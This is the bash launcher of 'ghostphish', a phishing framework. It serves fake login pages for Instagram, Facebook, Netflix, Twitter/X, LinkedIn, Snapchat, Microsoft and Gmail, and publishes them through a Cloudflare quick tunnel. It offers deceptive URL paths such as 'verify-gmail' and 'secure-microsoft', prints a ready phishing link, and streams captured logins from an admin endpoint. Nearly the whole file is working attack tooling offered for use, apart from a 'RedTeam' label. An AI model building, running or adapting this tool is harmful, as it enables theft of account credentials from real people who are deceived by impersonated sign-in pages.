#!/usr/bin/env bash
#
# ghostphish — interactive CLI launcher (zphisher-style)
# Developed by Yaman.RedTeam
#

set -o pipefail

# ─── Colors — hacker palette ──────────────────────
R='\033[0;31m'     # red
G='\033[0;32m'     # green (matrix)
Y='\033[1;33m'     # yellow
C='\033[0;36m'     # cyan
B='\033[1;34m'     # blue
M='\033[1;35m'     # magenta
W='\033[1;37m'     # white
RB='\033[1;31m'    # bright red
GB='\033[1;32m'    # bright green
YB='\033[1;33m'    # bright yellow
CB='\033[1;36m'    # bright cyan
BB='\033[1;34m'    # bright blue
MB='\033[1;35m'    # bright magenta
BOLD='\033[1m'
DIM='\033[2m'
ITA='\033[3m'
BLINK='\033[5m'
INV='\033[7m'
N='\033[0m'

# Text with red-magenta gradient for the wordmark
gradient() {
    local text="$1"
    local -a colors=('\033[38;5;196m' '\033[38;5;197m' '\033[38;5;198m' '\033[38;5;199m' '\033[38;5;200m' '\033[38;5;201m')
    local out="" len=${#text} i char cidx
    for ((i=0; i<len; i++)); do
        char="${text:$i:1}"
        cidx=$(( i * ${#colors[@]} / len ))
        out+="${colors[$cidx]}${char}"
    done
    echo -en "${out}\033[0m"
}

PORT=8000
SCRIPT_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" &> /dev/null && pwd)"
LOG_FILE="/tmp/ghostphish_tunnel.log"
PID_FILE="/tmp/ghostphish_tunnel.pid"

# ─── Templates ────────────────────────────────────
declare -a TEMPLATES=(
    "instagram|📸|Instagram|Dark theme, close friends hero"
    "facebook|📘|Facebook|White bg, photo cards, real logos"
    "netflix|🎬|Netflix|Dark hero, red wordmark"
    "twitter|✖️|Twitter / X|Black bg, huge X logo, SSO buttons"
    "linkedin|💼|LinkedIn|Beige bg, professional style"
    "snapchat|👻|Snapchat|Yellow header, ghost logo"
    "microsoft|🪟|Microsoft|Cosmic dark bg, 2-step OAuth"
    "gmail|📧|Gmail|Dark theme, colored G, 2-step flow"
)

# ─── Helpers — hacker aesthetic ───────────────────
banner() {
    clear
    echo ""
    echo -e "${RB}   ╔══════════════════════════════════════════════════════════════════╗${N}"
    echo -e "${RB}   ║${N}                                                                  ${RB}║${N}"
    echo -e "${RB}   ║${N}       ${GB}[${N} ${C}modern phishing framework${N} ${GB}·${N} ${YB}v1.0.0${N} ${GB}]${N}              ${RB}║${N}"
    echo -e "${RB}   ║${N}    ${DIM}Developed by${N} $(gradient 'Yaman.RedTeam')  ${DIM}·${N}  ${DIM}github/Yaman-RedTeam${N}   ${RB}║${N}"
    echo -e "${RB}   ║${N}                                                                  ${RB}║${N}"
    echo -e "${RB}   ╚══════════════════════════════════════════════════════════════════╝${N}"
    echo -e "   ${GB}${BLINK}●${N} ${G}booted${N}   ${GB}${BLINK}●${N} ${G}armed${N}   ${GB}${BLINK}●${N} ${G}silent${N}   ${GB}${BLINK}●${N} ${G}listening${N}"
    echo ""
}

msg_ok()   { echo -e "   ${GB}[${G}✓${GB}]${N} ${W}$*${N}"; }
msg_err()  { echo -e "   ${RB}[${R}✗${RB}]${N} ${W}$*${N}"; }
msg_info() { echo -e "   ${CB}[${C}i${CB}]${N} ${W}$*${N}"; }
msg_warn() { echo -e "   ${YB}[${Y}!${YB}]${N} ${W}$*${N}"; }

# Typewriter effect (fast)
typewrite() {
    local text="$1"
    local delay="${2:-0.005}"
    local i
    for ((i=0; i<${#text}; i++)); do
        printf "%s" "${text:$i:1}"
        sleep "$delay"
    done
    echo ""
}

pause_for() {
    echo ""
    read -rp "  $(echo -e ${DIM})Press Enter to continue$(echo -e ${N})" _
}

# ─── Dependency checks ────────────────────────────
check_deps() {
    local missing=()
    command -v docker >/dev/null 2>&1 || missing+=("docker")
    (command -v docker-compose >/dev/null 2>&1 || docker compose version >/dev/null 2>&1) || missing+=("docker-compose")

    if [ ${#missing[@]} -ne 0 ]; then
        msg_err "Missing dependencies: ${missing[*]}"
        msg_info "Install docker + docker-compose, then re-run."
        exit 1
    fi

    if ! docker info >/dev/null 2>&1; then
        msg_err "Docker daemon not running — start it first."
        exit 1
    fi
}

# ─── Container mgmt ───────────────────────────────
is_running() {
    curl -s -o /dev/null -w "%{http_code}" "http://localhost:${PORT}/health" 2>/dev/null | grep -q "200"
}

start_container() {
    if is_running; then
        msg_ok "ghostphish already running on port ${PORT}"
        return 0
    fi
    msg_info "Starting Docker container..."
    (cd "$SCRIPT_DIR" && docker-compose up -d --build 2>&1) | tail -3
    sleep 3
    if is_running; then
        msg_ok "Container up on http://localhost:${PORT}"
    else
        msg_err "Container failed to start. Check: docker logs ghostphish"
        exit 1
    fi
}

# ─── Cloudflared tunnel ───────────────────────────
start_tunnel() {
    if ! command -v cloudflared >/dev/null 2>&1; then
        msg_warn "cloudflared not installed — falling back to localhost."
        msg_info "Install: https://developers.cloudflare.com/cloudflare-one/connections/connect-networks/downloads/"
        echo ""
        TUNNEL_URL="http://localhost:${PORT}"
        return 1
    fi

    echo ""
    echo -e "   ${CB}┌─${N}${W} TUNNEL DEPLOY ${N}${CB}────────────────────────────────────────────┐${N}"
    echo -e "   ${CB}│${N}                                                              ${CB}│${N}"
    echo -e "   ${CB}│${N}   ${G}▶${N} ${DIM}killing stale tunnels...${N}                                ${CB}│${N}"
    pkill -f "cloudflared tunnel" 2>/dev/null; sleep 1
    : > "$LOG_FILE"
    echo -e "   ${CB}│${N}   ${G}▶${N} ${DIM}connecting to Cloudflare edge...${N}                        ${CB}│${N}"

    cloudflared tunnel --url "http://localhost:${PORT}" --no-autoupdate > "$LOG_FILE" 2>&1 &
    TUNNEL_PID=$!
    echo $TUNNEL_PID > "$PID_FILE"

    # Spinner while waiting
    local spinner_chars=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    TUNNEL_URL=""
    for i in {1..30}; do
        TUNNEL_URL=$(grep -oE 'https://[a-z0-9-]+\.trycloudflare\.com' "$LOG_FILE" | head -1)
        if [[ -n "$TUNNEL_URL" ]]; then
            printf "\r   ${CB}│${N}   ${G}▶${N} ${DIM}quick-tunnel URL acquired${N}                             ${CB}│${N}\n"
            break
        fi
        printf "\r   ${CB}│${N}   ${Y}${spinner_chars[$((i % 10))]}${N} ${DIM}waiting for URL...${N}                                       ${CB}│${N}"
        sleep 1
    done
    echo ""

    if [[ -z "$TUNNEL_URL" ]]; then
        echo -e "   ${CB}│${N}   ${R}✗${N} ${R}tunnel failed${N}                                            ${CB}│${N}"
        echo -e "   ${CB}└──────────────────────────────────────────────────────────────┘${N}"
        msg_err "Check $LOG_FILE"
        TUNNEL_URL="http://localhost:${PORT}"
        return 1
    fi

    echo -e "   ${CB}│${N}   ${G}▶${N} ${DIM}handshake ok · TLS pinned · edge=cloudflare${N}             ${CB}│${N}"
    echo -e "   ${CB}└──────────────────────────────────────────────────────────────┘${N}"
    echo ""
    msg_ok "tunnel LIVE ${DIM}→${N} ${GB}${TUNNEL_URL}${N}"
    sleep 1
    return 0
}

# ─── Template menu ────────────────────────────────
show_menu() {
    banner
    echo -e "   ${MB}┌─${N}${W} SELECT TARGET TEMPLATE ${N}${MB}────────────────────────────────────┐${N}"
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    local i=1
    for t in "${TEMPLATES[@]}"; do
        IFS='|' read -r slug icon name desc <<< "$t"
        printf "   ${MB}│${N}   ${YB}[%2d]${N}  ${icon}  ${GB}%-14s${N}  ${DIM}%-27s${N}   ${MB}│${N}\n" "$i" "$name" "$desc"
        i=$((i+1))
    done
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    printf "   ${MB}│${N}   ${YB}[ 0]${N}  ${R}⏻${N}  ${R}Exit${N}                                            ${MB}│${N}\n"
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    echo -e "   ${MB}└──────────────────────────────────────────────────────────────┘${N}"
    echo ""
}

pick_template() {
    while true; do
        show_menu
        read -rp "$(echo -e "   ${GB}root${N}${DIM}@${N}${CB}ghost${N}:${BB}~/phish${N}${W}#${N} ")" choice
        if [[ "$choice" == "0" ]]; then
            echo ""
            echo -e "   ${RB}[${R}✗${RB}]${N} ${DIM}session terminated.${N}"
            echo -e "   ${DIM}stay hidden.${N}"
            echo ""
            exit 0
        fi
        if [[ "$choice" =~ ^[1-9][0-9]*$ ]] && (( choice >= 1 && choice <= ${#TEMPLATES[@]} )); then
            IFS='|' read -r SEL_SLUG SEL_ICON SEL_NAME SEL_DESC <<< "${TEMPLATES[$((choice-1))]}"
            return 0
        fi
        msg_err "Invalid choice — enter a number from the menu."
        sleep 1
    done
}

# ─── Delivery mode menu ───────────────────────────
pick_mode() {
    banner
    echo -e "   ${DIM}target locked ▸${N} ${SEL_ICON}  ${GB}${SEL_NAME}${N}"
    echo ""
    echo -e "   ${CB}┌─${N}${W} DEPLOYMENT VECTOR ${N}${CB}────────────────────────────────────────┐${N}"
    echo -e "   ${CB}│${N}                                                              ${CB}│${N}"
    printf "   ${CB}│${N}   ${YB}[1]${N}  ${G}⚡${N}  ${GB}%-22s${N} ${DIM}%-25s${N}   ${CB}│${N}\n" "Cloudflared tunnel" "public HTTPS · no account"
    printf "   ${CB}│${N}   ${YB}[2]${N}  ${C}⚙${N}   ${GB}%-22s${N} ${DIM}%-25s${N}   ${CB}│${N}\n" "Localhost only" "same-machine testing"
    printf "   ${CB}│${N}   ${YB}[0]${N}  ${R}←${N}  ${R}%-22s${N}                          ${CB}│${N}\n" "Back"
    echo -e "   ${CB}│${N}                                                              ${CB}│${N}"
    echo -e "   ${CB}└──────────────────────────────────────────────────────────────┘${N}"
    echo ""
    read -rp "$(echo -e "   ${GB}root${N}${DIM}@${N}${CB}ghost${N}:${BB}~/vector${N}${W}#${N} ")" mode_choice
    case "$mode_choice" in
        1) DELIVERY="tunnel" ;;
        2) DELIVERY="local" ;;
        0) return 1 ;;
        *) msg_err "Invalid choice"; sleep 1; return 1 ;;
    esac
    return 0
}

# ─── Custom URL path ──────────────────────────────
pick_url_path() {
    banner
    echo -e "   ${DIM}target ▸${N} ${SEL_ICON}  ${GB}${SEL_NAME}${N}   ${DIM}vector ▸${N} ${YB}${DELIVERY}${N}"
    echo ""
    echo -e "   ${MB}┌─${N}${W} URL MASK ${N}${MB}─────────────────────────────────────────────────┐${N}"
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    printf "   ${MB}│${N}   ${YB}[1]${N}  ${C}⚪${N}  ${GB}%-22s${N} ${DIM}%-25s${N}   ${MB}│${N}\n" "Default" "/${SEL_SLUG}"
    printf "   ${MB}│${N}   ${YB}[2]${N}  ${G}✏️${N}   ${GB}%-22s${N} ${DIM}%-25s${N}   ${MB}│${N}\n" "Custom path" "type your own disguise"
    printf "   ${MB}│${N}   ${YB}[3]${N}  ${Y}⚡${N}  ${GB}%-22s${N} ${DIM}%-25s${N}   ${MB}│${N}\n" "Quick presets" "realistic-looking suggestions"
    printf "   ${MB}│${N}   ${YB}[0]${N}  ${R}←${N}  ${R}%-22s${N}                          ${MB}│${N}\n" "Back"
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    echo -e "   ${MB}└──────────────────────────────────────────────────────────────┘${N}"
    echo ""
    read -rp "$(echo -e "   ${GB}root${N}${DIM}@${N}${CB}ghost${N}:${BB}~/mask${N}${W}#${N} ")" path_choice

    case "$path_choice" in
        1) URL_PATH="$SEL_SLUG" ;;
        2)
            echo ""
            echo -e "  ${DIM}Enter custom path (letters, digits, - only). Ex: ${SEL_SLUG}-login-verify${N}"
            read -rp "  $(echo -e ${G})custom${N} > " URL_PATH
            URL_PATH=$(echo "$URL_PATH" | tr '[:upper:]' '[:lower:]' | tr -c 'a-z0-9-' '-' | sed 's/^-*//; s/-*$//')
            if [[ -z "$URL_PATH" ]]; then
                msg_err "Empty path"; sleep 1; return 1
            fi
            register_alias "$URL_PATH" "$SEL_SLUG" || return 1
            ;;
        3)
            banner
            echo -e "  Presets for ${W}${SEL_NAME}${N}:\n"
            local -a PRESETS=(
                "${SEL_SLUG}login"
                "${SEL_SLUG}-login"
                "login-${SEL_SLUG}"
                "verify-${SEL_SLUG}"
                "${SEL_SLUG}-verify-account"
                "secure-${SEL_SLUG}"
                "${SEL_SLUG}-account-verify"
                "auth-${SEL_SLUG}"
            )
            local i=1
            for p in "${PRESETS[@]}"; do
                printf "   ${Y}[%d]${N}  ${W}%s${N}\n" "$i" "$p"
                i=$((i+1))
            done
            echo ""
            read -rp "  $(echo -e ${G})preset${N} > " ps
            if [[ "$ps" =~ ^[1-9][0-9]*$ ]] && (( ps >= 1 && ps <= ${#PRESETS[@]} )); then
                URL_PATH="${PRESETS[$((ps-1))]}"
                register_alias "$URL_PATH" "$SEL_SLUG" || return 1
            else
                msg_err "Invalid"; sleep 1; return 1
            fi
            ;;
        0) return 1 ;;
        *) msg_err "Invalid"; sleep 1; return 1 ;;
    esac
    return 0
}

register_alias() {
    local path="$1"
    local tpl="$2"
    local resp
    resp=$(curl -s -X POST "http://localhost:${PORT}/admin/aliases" \
        -H "Content-Type: application/json" \
        -d "{\"path\":\"${path}\",\"template\":\"${tpl}\"}")
    if echo "$resp" | grep -q '"success":true'; then
        msg_ok "Alias registered: /${path} → ${tpl}"
        sleep 1
        return 0
    else
        msg_err "Failed to register alias: $resp"
        sleep 2
        return 1
    fi
}

# ─── Result screen ────────────────────────────────
show_link() {
    banner
    local full_url="${TUNNEL_URL}/${URL_PATH:-$SEL_SLUG}"

    echo -e "   ${GB}╔══════════════════════════════════════════════════════════════╗${N}"
    echo -e "   ${GB}║${N}                    ${GB}⚡  PAYLOAD ARMED  ⚡${N}                     ${GB}║${N}"
    echo -e "   ${GB}╚══════════════════════════════════════════════════════════════╝${N}"
    echo ""
    echo -e "   ${DIM}target${N}   ${SEL_ICON}  ${GB}${SEL_NAME}${N} ${DIM}(${SEL_DESC})${N}"
    echo -e "   ${DIM}vector${N}   ${Y}⚡${N}  ${W}${DELIVERY}${N}"
    echo -e "   ${DIM}mask${N}     ${M}/${URL_PATH:-$SEL_SLUG}${N}"
    echo ""
    echo -e "   ${MB}┌─${N}${W} PHISHING LINK ${N}${MB}────────────────────────────────────────────┐${N}"
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    echo -e "   ${MB}│${N}   ${GB}${BOLD}${full_url}${N}"
    echo -e "   ${MB}│${N}                                                              ${MB}│${N}"
    echo -e "   ${MB}└──────────────────────────────────────────────────────────────┘${N}"
    echo ""
    echo -e "   ${DIM}◈${N} ${CB}admin${N}     ${DIM}${TUNNEL_URL}/admin/captures${N}"
    echo -e "   ${DIM}◈${N} ${CB}stats${N}     ${DIM}python3 stats.py${N}"
    echo -e "   ${DIM}◈${N} ${CB}export${N}    ${DIM}python3 export_captures.py csv${N}"
    if [[ "$DELIVERY" == "tunnel" ]]; then
        echo -e "   ${DIM}◈${N} ${CB}tun.log${N}   ${DIM}tail -f ${LOG_FILE}${N}"
    fi
    echo ""
    echo -e "   ${RB}╔══════════════════════════════════════════════════════════════╗${N}"
    echo -e "   ${RB}║${N}     ${G}${BLINK}●${N} ${W}LIVE CAPTURE STREAM${N}   ${DIM}[ctrl+c to detach]${N}          ${RB}║${N}"
    echo -e "   ${RB}╚══════════════════════════════════════════════════════════════╝${N}"
    echo -e "   ${DIM}${ITA}listening on the wire...${N}"
    echo ""

    # Reliable Python watcher — polls admin API every 2s
    python3 "${SCRIPT_DIR}/watch_captures.py"
}

# ─── Main flow ────────────────────────────────────
main() {
    banner
    msg_info "Checking dependencies..."
    check_deps
    msg_ok "docker + docker-compose present"

    if command -v cloudflared >/dev/null 2>&1; then
        msg_ok "cloudflared present ($(cloudflared --version 2>&1 | head -1 | awk '{print $3}'))"
    else
        msg_warn "cloudflared not installed (localhost-only mode available)"
    fi
    sleep 1

    start_container

    while true; do
        pick_template
        if pick_mode; then
            URL_PATH=""
            if ! pick_url_path; then continue; fi
            if [[ "$DELIVERY" == "tunnel" ]]; then
                banner
                start_tunnel
            else
                TUNNEL_URL="http://localhost:${PORT}"
            fi
            show_link
        fi
    done
}

main "$@"
